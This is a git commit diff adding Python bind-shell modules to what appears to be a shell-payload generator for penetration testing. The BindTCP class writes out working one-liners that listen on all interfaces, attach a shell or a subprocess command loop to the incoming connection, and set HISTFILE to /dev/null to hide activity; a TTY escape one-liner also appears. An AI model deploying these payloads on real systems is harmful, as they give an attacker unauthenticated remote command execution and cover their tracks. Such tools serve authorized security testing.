f2c7735b825c1c2c0a26da69d2a341814a4affe7
smith <smith.nguyenhoangthanh@gmail.com>
2021-02-16 04:38:00 +0700

    add Bind shell TCP Python

--- shellgen/modules/multi/python.py
+++ shellgen/modules/multi/python.py
@@ -68,7 +68,6 @@ class TTY(plugin.Module):
         self.opts.description = "[TTYShell] Python TTY shell escape from https://netsec.ws/?p=337"
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
-
     def make_shell(self):
         self.shell = f"""{self.args.type} -c 'import pty; pty.spawn("{self.args.shell}")'"""
 
@@ -78,3 +77,53 @@ class ReverseUDP(ReverseTCP):
         super().__init__()
         self.is_udp = True
         self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
+
+
+class BindTCP(plugin.BindShell):
+    def __init__(self):
+        super().__init__()
+        self.add_args(
+            "--type",
+            default="python",
+            choices=[
+                'python',
+                'python2',
+                'python3'
+            ],
+            help="Select python type: python, python2, python3 (default: python)"
+        )
+        self.add_args(
+            "--exec",
+            default="pty",
+            choices=[
+                'pty',
+                'subprocess',
+            ]
+        )
+        self.add_args(
+            "--shell",
+            default="bash",
+            choices=const.LINUX_SHELL,
+            help="Select shell type on target machine"
+        )
+        self.extension = "py"
+        self.set_write_file()
+        self.opts.description = "[BindShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
+        self.opts.description = "\n[BindShell][TCP] Python from infodox/python-pty-shells. License WTFPL."
+        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
+
+    def make_shell(self):
+        if self.args.exec == "pty":
+            self.shell = f"""{self.args.type} -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.args.port}));s.listen(1);(rem,addr)=s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("{self.args.shell}");s.close()'"""
+        else:
+            self.shell = f'''{self.args.type} -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{self.args.port}));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")\''''
+
+
+class BindUDP(BindTCP):
+    def __init__(self):
+        super().__init__()
+        self.is_udp = True
+        self.opts.description = "[BindShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
+
+    def make_shell(self):
+        pass # TODO make Bind shell python UDP with pty & subprocess
